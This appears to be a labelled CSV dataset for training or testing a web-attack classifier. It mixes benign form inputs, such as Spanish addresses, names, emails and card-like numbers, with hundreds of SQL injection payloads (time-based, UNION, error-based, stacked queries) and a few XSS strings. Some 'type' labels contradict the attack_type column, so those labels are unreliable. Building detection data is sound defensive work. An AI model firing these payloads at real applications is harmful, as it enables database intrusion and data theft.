Text,attack_type,Label,type
"-9772' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'igaa'='igaa",sqli,1,sql
"lugar higuera canaria, 169",norm,0,normal
-4518 where 8023=8023 or 6872=6872--,sqli,1,sql
"1')) as agdn where 8442=8442 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
22880,norm,0,normal
3246727174797252,norm,0,normal
rastrilladora,norm,0,normal
"1) where 3030=3030;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
"1%"");waitfor delay '0:0:5' and (""%""=""",sqli,1,sql
"avinguda francesc macia., 30 3?b",norm,0,normal
"1"")));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
0049063230467813,norm,0,normal
tapioles,norm,0,normal
armero filippi,norm,0,normal
"-5078 union all select 9708,9708--",sqli,1,sql
"-6632) union all select 4073,4073,4073,4073,4073,4073,4073,4073--",sqli,1,sql
hindman@primeracasa-ebs.il,norm,0,normal
vilaller,norm,0,normal
"1 where 6412=6412 union all select null,null,null,null,null,null,null--",sqli,1,sql
mallku,norm,0,normal
"1') and elt(4249=4249,7259) and ('ifca' like 'ifca",sqli,1,normal
"1%"")) union all select null,null,null,null,null,null--",sqli,1,sql
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('xcxr' like 'xcxr",sqli,1,sql
39672063f,norm,0,normal
ha3fila,norm,0,normal
1465508294467893,norm,0,normal
1 where 6494=6494 and 8463=2760,sqli,1,normal
kerjean@global-services.be,norm,0,normal
"1'||(select 'fcnb' where 2869=2869 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'",sqli,1,sql
"1"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""woun"" like ""woun",sqli,1,sql
1 where 3502=3502 order by 1--,sqli,1,sql
otia,norm,0,normal
10262643c,norm,0,normal
1' where 1045=1045 or 6793=(select 6793 from pg_sleep(5))--,sqli,1,sql
c/ oblit 76,norm,0,normal
42520233h,norm,0,normal
dillon@indagacion.pa,norm,0,normal
1)) and sleep(5)#,sqli,1,normal
sagunto/sagunt,norm,0,normal
1'||(select 'ptfi' from dual where 2234=2234 and 2006=2006,sqli,1,sql
"1') as wpom where 2620=2620 and elt(3114=3114,sleep(5))#",sqli,1,normal
gonzalvo gorriti,norm,0,normal
15911,norm,0,normal
29001,norm,0,normal
1%');select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
dev,norm,0,normal
25,norm,0,normal
6968107643811968,norm,0,normal
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('lwyo'='lwyo",sqli,1,sql
agra leuco,norm,0,normal
onzonilla,norm,0,normal
57418420r,norm,0,normal
jasper,norm,0,normal
"1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('gxgi'='gxgi",sqli,1,normal
-6518')) as vocx where 2539=2539 or (8652=2025)*2025--,sqli,1,sql
"1) or 8421=(select count(*) from generate_series(1,5000000)) and (5215=5215",sqli,1,sql
"1' union all select null,null#",sqli,1,sql
10666,norm,0,normal
tabar,norm,0,normal
55341505d,norm,0,normal
81383348x,norm,0,normal
alperovi,norm,0,normal
"1"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""alkz""=""alkz",sqli,1,normal
avenida casanova de eiris 42 3?c,norm,0,normal
1%';select (case when (2783=9216) then 1 else 2783*(select 2783 from master..sysdatabases) end)--,sqli,1,sql
"1') union all select null,null--",sqli,1,sql
tsampoulas_chartrand@purplemoongrn.za,norm,0,normal
"1 and elt(3172=7243,7243)",sqli,1,normal
1 and 6969=(select 6969 from pg_sleep(5)),sqli,1,sql
"-3595'+(select vppx where 6018=6018 union all select 6018,6018,6018,6018,6018#",sqli,1,sql
lobera,norm,0,normal
"1) where 2543=2543;iif(2205=4764,1,1/0)",sqli,1,sql
3146,norm,0,normal
89740217j,norm,0,normal
"1"") or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
7136608915366167,norm,0,normal
"1"");select (case when (1868=5071) then 1 else 1868*(select 1868 from master..sysdatabases) end)--",sqli,1,sql
96685723w,norm,0,normal
"1"" and 7533=7533",sqli,1,normal
dueas cristaldo,norm,0,normal
1)) and 7533=7533 and ((8738=8738,sqli,1,normal
"-5597') or make_set(2490=2164,2164)",sqli,1,normal
16856,norm,0,normal
"1"");select (case when (2676=4191) then 2676 else 1/(select 0) end)--",sqli,1,sql
timb44,norm,0,normal
persson_mcclanahan@deseoun.km,norm,0,normal
tabakov@wdsl.ly,norm,0,normal
"1'+(select vfmy where 5711=5711;iif(5214=7412,1,1/0)",sqli,1,sql
receptadora,norm,0,normal
"1%"" rlike (select * from (select(sleep(5)))sgvo) and ""%""=""",sqli,1,sql
7288676162465612,norm,0,normal
arrigorriaga,norm,0,normal
"1)) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"-5573') union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",sqli,1,sql
05290,norm,0,normal
"1""))) or 6793=(select 6793 from pg_sleep(5)) and (((""azmf""=""azmf",sqli,1,sql
"1)));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((5552=5552",sqli,1,sql
7328487028477880,norm,0,normal
7$34mon3a5,norm,0,normal
"1%' and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"1"" and make_set(4214=9503,9503) and ""phjg"" like ""phjg",sqli,1,normal
pred6.finir,norm,0,normal
"1%"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""%""=""",sqli,1,normal
1') as hcpp where 1863=1863;if(7340=9813) select 7340 else drop function yppp--,sqli,1,sql
torremocha de jadraque,norm,0,normal
"1') and 8407=(select count(*) from generate_series(1,5000000)) and ('pgyl'='pgyl",sqli,1,sql
60516960g,norm,0,normal
73002359z,norm,0,normal
reis,norm,0,normal
ombra,norm,0,normal
1' in boolean mode) rlike (select * from (select(sleep(5)))sgvo)#,sqli,1,sql
"1') as pkis where 3446=3446 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1,sql
4994071858683051,norm,0,normal
monforte de la sierra,norm,0,normal
1459,norm,0,normal
51407196b,norm,0,normal
beneit pao,norm,0,normal
"c/ pedro guezala 192, 6?a",norm,0,normal
"1%"") and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (""%""=""",sqli,1,normal
"1'||(select 'skds' from dual where 8594=8594 and make_set(6779=2027,2027))||'",sqli,1,sql
perrier,norm,0,normal
"1"")) as eglv where 7412=7412 union all select null#",sqli,1,sql
08695,norm,0,normal
-7442) or 3391=7492,sqli,1,normal
"-1097"" where 4421=4421 union all select 4421,4421,4421,4421,4421#",sqli,1,sql
brooking-doolittle@encuentrodominios.lv,norm,0,normal
30hi6h571ar,norm,0,normal
s!u2cep7ivo,norm,0,normal
peaflor de hornija,norm,0,normal
16802646l,norm,0,normal
valverde de burguillos,norm,0,normal
polson,norm,0,normal
navratil@sindns.as,norm,0,normal
"1)) as vycb where 3524=3524 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
dekeyser@creacionwebs.bn,norm,0,normal
"1))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((8018=8018",sqli,1,sql
rosoli,norm,0,normal
1'+(select 'xbyn' where 6881=6881;begin user_lock.sleep(5); end)+',sqli,1,sql
mathur,norm,0,normal
36628106p,norm,0,normal
margaux,norm,0,normal
santa marta del cerro,norm,0,normal
1' where 9416=9416;begin user_lock.sleep(5); end--,sqli,1,sql
wara,norm,0,normal
sumahya,norm,0,normal
"1) where 6990=6990 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"-3620'||(select 'kmei' where 8533=8533 union all select 8533,8533,8533,8533--",sqli,1,sql
mckearne,norm,0,normal
byrgesen,norm,0,normal
"-2701"")) as wvht where 5401=5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",sqli,1,sql
"1"")) and 4595=4595#",sqli,1,normal
"1"") or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""mejy""=""mejy",sqli,1,sql
"-1998') as kgvf where 2346=2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",sqli,1,sql
parnell,norm,0,normal
c/ rosario 192 2?b,norm,0,normal
llaguno,norm,0,normal
"-9507%"" union all select 3342,3342,3342,3342,3342#",sqli,1,sql
0455475530257708,norm,0,normal
despacio,norm,0,normal
"1' where 8860=8860 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,1,sql
matthews.russa@pensionesbaratas.com.bi,norm,0,normal
cusell vinageras,norm,0,normal
ratbodo,norm,0,normal
tors,norm,0,normal
"1) as xuvz where 3061=3061 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
1'||(select 'irfn' where 8360=8360;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
verdes,norm,0,normal
falbee0,norm,0,normal
m86uca,norm,0,normal
confiadora,norm,0,normal
1784777474489263,norm,0,normal
"c/ codigo correspondencia oficial correos-telegrafos 71, 10d",norm,0,normal
willie51,norm,0,normal
1'||(select 'svnn' from dual where 8710=8710;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
9370319487845203,norm,0,normal
"-9615) as dntk where 4780=4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",sqli,1,sql
"1) where 5309=5309 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
34449,norm,0,normal
8728407984769930,norm,0,normal
37763,norm,0,normal
"1')) and elt(1210=1210,sleep(5)) and (('ogpg'='ogpg",sqli,1,normal
"-1<img src="" javascript:document.cookie=true;"">",xss,2,xss
maximiliano,norm,0,normal
"c/ huescar 60,",norm,0,normal
plza. felix rodriguez de la fuente 140 3a,norm,0,normal
"1"")) union all select null,null,null,null#",sqli,1,sql
"1' in boolean mode) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)#",sqli,1,sql
"c/ fuente pista de tenis, 164",norm,0,normal
"-1894') union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",sqli,1,sql
1%' or sleep(5)#,sqli,1,normal
"1%"")) and elt(3114=3114,sleep(5))#",sqli,1,normal
"1"") where 4588=4588;begin dbms_lock.sleep(5); end--",sqli,1,sql
1 where 1931=1931 and sleep(5)--,sqli,1,sql
6206191254660151,norm,0,normal
kfir,norm,0,normal
1%'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('%'=',sqli,1,sql
"1%'))) or elt(6272=6272,sleep(5)) and ((('%'='",sqli,1,normal
36820,norm,0,normal
<script>confirm(0);</script>,xss,2,xss
graja,norm,0,normal
"1') where 6774=6774 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
1) where 9167=9167;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
50708405y,norm,0,normal
retejador,norm,0,normal
brihuega uslet,norm,0,normal
jorge,norm,0,normal
kiri,norm,0,normal
georges,norm,0,normal
"1') as yuqv where 6007=6007 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,1,sql
bayuca,norm,0,normal
atezada,norm,0,normal
1) or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
bollullos par del condado,norm,0,normal
"-7501'+(select uloc where 3089=3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",sqli,1,sql
"almendro, 28 6?c",norm,0,normal
-3084%')) order by 1--,sqli,1,sql
">""<xml src=""javascript:document.cookie=true;"">",xss,2,xss
47eg0,norm,0,normal
3849,norm,0,normal
"1%"" and 6969=(select 6969 from pg_sleep(5)) and ""%""=""",sqli,1,sql
cristbal,norm,0,normal
"1%""))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""",sqli,1,sql
-3921') as audo where 7087=7087 or 1755=4937--,sqli,1,sql
"<style type=""text/css"">body{background:url(""javascript:alert('xss')"")}</style>",xss,2,xss
leonella,norm,0,normal
barcelona,norm,0,normal
"-1164"") union all select 6617,6617,6617,6617,6617,6617--",sqli,1,sql
1' rlike sleep(5)#,sqli,1,normal
peri portaneri,norm,0,normal
"1%' and elt(7619=1489,1489) and '%'='",sqli,1,normal
n89m3nd2,norm,0,normal
log9era,norm,0,normal
"1);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",sqli,1,sql
7272917416802626,norm,0,normal
0197876956887475,norm,0,normal
emp34h82o,norm,0,normal
anatoli,norm,0,normal
59041581y,norm,0,normal
41309,norm,0,normal
gila-berova@artforall.mm,norm,0,normal
trace,norm,0,normal
27002424x,norm,0,normal
"1' in boolean mode) and make_set(8403=8403,8899)#",sqli,1,normal
4243993376239926,norm,0,normal
43893,norm,0,normal
-9809' order by 1--,sqli,1,sql
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'rxdz'='rxdz",sqli,1,sql
7984505831107491,norm,0,normal
ven1no,norm,0,normal
-6218')) or 2236=4469#,sqli,1,normal
"1',(select (case when (5141=5141) then (ascii(regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))) else 5141/(select 0 from (values(0))) end) from (values(0)))",sqli,1,sql
"tercio de napolitanos, 104 4-b",norm,0,normal
"pl. ingeniero torres quevedo, s/n 7?a",norm,0,normal
"-2384%')) union all select 2467,2467,2467,2467#",sqli,1,sql
"1) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",sqli,1,normal
4468,norm,0,normal
casademonts,norm,0,normal
woodworth_balchowsky@faders.com.bf,norm,0,normal
"1"") where 4180=4180 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
"-1238') as lxur where 7075=7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#",sqli,1,sql
47239,norm,0,normal
santa clara de avedillo,norm,0,normal
1 rlike sleep(5),sqli,1,normal
"1' where 7445=7445 union all select null,null,null,null,null,null--",sqli,1,sql
"1"");select count(*) from generate_series(1,5000000) and (""kngx"" like ""kngx",sqli,1,sql
37340,norm,0,normal
solski9,norm,0,normal
1) where 2307=2307;select (case when (1946=1302) then 1946 else 1/(select 0) end)--,sqli,1,sql
33784,norm,0,normal
18001,norm,0,normal
"1"") as obbk where 6414=6414 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
viseu 81 8?c,norm,0,normal
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'drui' like 'drui",sqli,1,normal
"1%') and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
bazo san salvador,norm,0,normal
almoga,norm,0,normal
"1') as qaec where 6572=6572 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
27388,norm,0,normal
papanduja,norm,0,normal
8732,norm,0,normal
2116,norm,0,normal
"1') as rvch where 1863=1863 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"pobla tornesa, la",norm,0,normal
tagle isurieta,norm,0,normal
27784,norm,0,normal
nogu cabaas,norm,0,normal
1aqu0ta,norm,0,normal
1))) and 6467=1864#,sqli,1,normal
ardurn,norm,0,normal
yevtushenko-pegna@corjet.al,norm,0,normal
88253687l,norm,0,normal
"1%') union all select null,null,null,null,null#",sqli,1,sql
shade@bwds.name,norm,0,normal
2753,norm,0,normal
"-9096"") where 9452=9452 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli,1,sql
m7124v3,norm,0,normal
muir-vasilescu5@lodgeinmadrid.ir,norm,0,normal
riegger.zaleska@cirujanaplastica.cn,norm,0,normal
"1'+(select gblp where 6768=6768;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"-1287"") as bbzg where 1475=1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",sqli,1,sql
-7452 where 2224=2224 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
caleruega,norm,0,normal
prestamente,norm,0,normal
collazo fonts,norm,0,normal
ivey,norm,0,normal
7806339136091099,norm,0,normal
copa,norm,0,normal
02703849s,norm,0,normal
ga+vanza,norm,0,normal
milly7,norm,0,normal
"c/ iguazu, 109, 8?a",norm,0,normal
plutarco,norm,0,normal
loamiento,norm,0,normal
gtova,norm,0,normal
rhys,norm,0,normal
13270,norm,0,normal
"c/ja arco 125,",norm,0,normal
"1);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1) union all select null,null--",sqli,1,sql
gallejon mingo,norm,0,normal
reco+nocida,norm,0,normal
sharnoff,norm,0,normal
orus patio,norm,0,normal
6511294088626969,norm,0,normal
"1)) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((7992=7992",sqli,1,sql
-8553'+(select adko where 1750=1750 union all select 1750#,sqli,1,sql
"1') or 8421=(select count(*) from generate_series(1,5000000)) and ('xkxi' like 'xkxi",sqli,1,sql
"1'||(select 'pvmz' from dual where 1090=1090 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))||'",sqli,1,sql
hammond-mcstay@enhierro.com.cn,norm,0,normal
"1"") waitfor delay '0:0:5'--",sqli,1,sql
"1%"";select (case when (8350=7872) then 8350 else 8350*(select 8350 from information_schema.character_sets) end)#",sqli,1,sql
8319713871546470,norm,0,normal
ribera vitols,norm,0,normal
"1"") as ranl where 5553=5553;select pg_sleep(5)--",sqli,1,sql
41392002y,norm,0,normal
"1"") or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",sqli,1,sql
"1%""))) and make_set(8191=7813,7813) and (((""%""=""",sqli,1,normal
"1')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
18056,norm,0,normal
1') rlike sleep(5) and ('qsub' like 'qsub,sqli,1,normal
chaiman,norm,0,normal
"-9156')) union all select 9110,9110,9110,9110#",sqli,1,sql
dans,norm,0,normal
eu,norm,0,normal
chamberlin@nikemujeres.py,norm,0,normal
"1) or elt(6272=6272,sleep(5)) and (8600=8600",sqli,1,normal
m6l25eo,norm,0,normal
7688145682842926,norm,0,normal
6432,norm,0,normal
"1'||(select 'vixv' from dual where 7704=7704 union all select null,null,null,null,null--",sqli,1,sql
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""tgdu""=""tgdu",sqli,1,sql
"-8355%""))) union all select 3004,3004,3004,3004,3004,3004,3004--",sqli,1,sql
hdbright6,norm,0,normal
28318850p,norm,0,normal
villarejo-periesteban,norm,0,normal
"cami de almoster, 109,",norm,0,normal
doris,norm,0,normal
"(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,1,sql
1%') and sleep(5)#,sqli,1,normal
laurance@familiamarino.td,norm,0,normal
zalee,norm,0,normal
schwarz,norm,0,normal
c/ sagrada familia 176,norm,0,normal
albuixech,norm,0,normal
collado mediano,norm,0,normal
co80j44l4,norm,0,normal
apo695169or6,norm,0,normal
c/ los castaos 10,norm,0,normal
lazo,norm,0,normal
95843081b,norm,0,normal
-7072') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),sqli,1,sql
13750,norm,0,normal
"madrid, 27",norm,0,normal
kepekci,norm,0,normal
ripley_kapianidze@reidesa.net,norm,0,normal
dionisio,norm,0,normal
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('xcnj'='xcnj",sqli,1,sql
villapalacios,norm,0,normal
05154,norm,0,normal
5011187157349121,norm,0,normal
tolan.herlie@movil-google.mx,norm,0,normal
1%'))) rlike sleep(5)#,sqli,1,normal
3805288652067342,norm,0,normal
-2936) or 6872=6872,sqli,1,normal
"1%';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
kartik,norm,0,normal
29400,norm,0,normal
"1"") as rgbz where 6687=6687 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
6u33a,norm,0,normal
"ibilbidea artiga 36, 11?d",norm,0,normal
349,norm,0,normal
"1)) as vmwj where 5597=5597;iif(5257=5257,1,1/0)",sqli,1,sql
"1' or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
de78e24423n6e,norm,0,normal
"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",sqli,1,sql
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",sqli,1,sql
supersticin,norm,0,normal
2306,norm,0,normal
adu7cir,norm,0,normal
"1%"")));select sleep(5)#",sqli,1,sql
alessandro,norm,0,normal
"1%';call regexp_substring(repeat(right(char(3702),0),500000000),null) and '%'='",sqli,1,sql
tiramollar,norm,0,normal
lachens@prestoesesto.py,norm,0,normal
4642,norm,0,normal
50615,norm,0,normal
"alonso de mendoza, 31 3b",norm,0,normal
"<img style=""xss:expr/*xss*/ession(alert('xss'))"">",xss,2,sql
hiromi,norm,0,normal
sayara,norm,0,normal
43700,norm,0,normal
kylo,norm,0,normal
alvin@arroyo-molinos.sl,norm,0,normal
0076747388160328,norm,0,normal
"1') as xagu where 9088=9088 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,1,sql
53933880f,norm,0,normal
ranez@sandrasummer.bi,norm,0,normal
"1%'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('%'='",sqli,1,sql
"1))) union all select null,null,null,null,null--",sqli,1,sql
veronese@prestigecars.tv,norm,0,normal
"1'||(select 'frrk' from dual where 3145=3145 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'",sqli,1,sql
"salvador perles, 23,",norm,0,normal
"-3756') union all select 1034,1034,1034--",sqli,1,sql
ursulina,norm,0,normal
matlock,norm,0,normal
to85lo372,norm,0,normal
ava8,norm,0,normal
cijuela,norm,0,normal
ballasko@quehaces.mr,norm,0,normal
0277189059505279,norm,0,normal
"-2821""))) union all select 3920,3920,3920,3920,3920,3920,3920#",sqli,1,sql
gilbuena,norm,0,normal
9859982019470735,norm,0,normal
keighley,norm,0,normal
1' and (3020=3020)*6703 and 'qsrz'='qsrz,sqli,1,normal
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('qdsr' like 'qdsr",sqli,1,normal
88356550a,norm,0,normal
struchkova@gestionsoftware.cl,norm,0,normal
"1%""));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
faraday,norm,0,normal
68370047v,norm,0,normal
"1"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""utzr"" like ""utzr",sqli,1,sql
deforeit,norm,0,normal
"1) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
5727406430841841,norm,0,normal
1')) as xkiq where 9008=9008 and sleep(5)--,sqli,1,sql
sant hilari sacalm,norm,0,normal
"1"") and 2954=1256--",sqli,1,sql
06440,norm,0,normal
1';select pg_sleep(5) and 'rpka'='rpka,sqli,1,sql
"1%'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",sqli,1,normal
lacero,norm,0,normal
c/ atlantico 167,norm,0,normal
1') rlike (select (case when (2721=8716) then 1 else 0x28 end)) and ('dumt'='dumt,sqli,1,sql
m0nuta9,norm,0,normal
"1'||(select 'dpje' where 2704=2704 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
1) rlike (select * from (select(sleep(5)))sgvo),sqli,1,sql
katsuno@novolardiseno.br,norm,0,normal
"-4165"" where 1772=1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",sqli,1,sql
ca1t01i4oso,norm,0,normal
7562939151589208,norm,0,normal
incisivo,norm,0,normal
ayca mols,norm,0,normal
16094499l,norm,0,normal
"-7738%"") union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",sqli,1,sql
"1%')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('%'='",sqli,1,sql
"c/ caceres, 74,",norm,0,normal
"1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""ljkg""=""ljkg",sqli,1,normal
"-5630"") or 3038=3038",sqli,1,normal
torre de arcas,norm,0,normal
